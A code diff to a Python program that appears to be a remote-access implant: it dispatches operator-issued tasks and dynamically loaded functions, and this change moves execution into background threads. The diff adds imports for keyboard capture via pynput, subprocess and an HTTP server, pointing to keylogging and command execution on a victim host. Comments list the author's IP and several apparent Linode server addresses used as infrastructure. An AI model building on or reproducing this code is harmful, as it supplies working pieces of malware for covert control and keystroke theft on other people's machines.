@@ -13,7 +13,17 @@ import struct
 import platform
 import os
 import getpass
-
+import threading
+from pynput import keyboard
+import re
+import sys
+# import Xlib
+# import Xlib.display
+import time
+import subprocess
+from subprocess import Popen, PIPE
+import stat
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from Crypto.Hash import SHA256, SHA512, SHA1, MD5, HMAC
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Random import get_random_bytes
@@ -37,7 +47,7 @@ delegates_aswers = []
 result = {}
 break_function = False
 
-# my ip 87.3.195.225
+# my ip 95.239.61.225
 # linode 194.195.242.157
 # linode 172.104.135.23
 # linode 172.104.135.67
@@ -278,26 +288,9 @@ def execute_tasks(tasks):
 
 
 
-def execute(task):
-
-    # Search in the dynamic functions first, so a command can be sobstituted through the load functionality
-    function = str(task['command'])
-    print("\n[+] EXECUTING " + function)
+def run_in_thread(function, param_list, task):
 
     found = False
-
-    param_list = "task['id'],"
-    if task['parameters'] != '' and task['parameters'][0] == "{":
-        parameters = ast.literal_eval(task['parameters'])
-        for param in parameters:
-            param_list += "ast.literal_eval(task['parameters'])['" + param + "'],"
-    else:
-        if task['parameters'] != '':
-            param_list += "task['parameters'],"
-
-
-
-    param_list = param_list[:-1]
 
     for item in dynfs:
         
@@ -331,6 +324,29 @@ def execute(task):
                     'status': 'error'
                 }
             responses.append(response)
+
+
+def execute(task):
+
+    # Search in the dynamic functions first, so a command can be sobstituted through the load functionality
+    function = str(task['command'])
+    print("\n[+] EXECUTING " + function)
+
+    param_list = "task['id'],"
+    if task['parameters'] != '' and task['parameters'][0] == "{":
+        parameters = ast.literal_eval(task['parameters'])
+        for param in parameters:
+            param_list += "ast.literal_eval(task['parameters'])['" + param + "'],"
+    else:
+        if task['parameters'] != '':
+            param_list += "task['parameters'],"
+
+
+
+    param_list = param_list[:-1]
+
+    thread = threading.Thread(target=run_in_thread, args=(function, param_list, task))
+    thread.start()
 
 
 
